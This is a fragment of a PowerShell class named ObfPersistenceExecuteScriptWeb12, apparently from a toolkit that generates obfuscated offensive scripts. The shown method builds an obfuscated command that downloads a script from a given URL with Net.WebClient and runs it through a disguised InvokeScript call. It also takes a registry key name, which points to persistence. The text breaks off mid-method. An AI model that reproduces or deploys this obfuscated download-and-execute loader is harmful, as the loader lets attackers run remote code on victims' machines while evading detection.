Class ObfPersistenceExecuteScriptWeb12 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent12.ps1
        $DoAll = "(GV *uti*t).Value.InvokeCommand|%`{`$_.(((GV *uti*t).Value.InvokeCommand.PsObject.Methods|?`{`$_.Name-clike'*k*i*t'`}).Name).Invoke((New-Object Net.WebClient).DownloadString('$url'))`}"
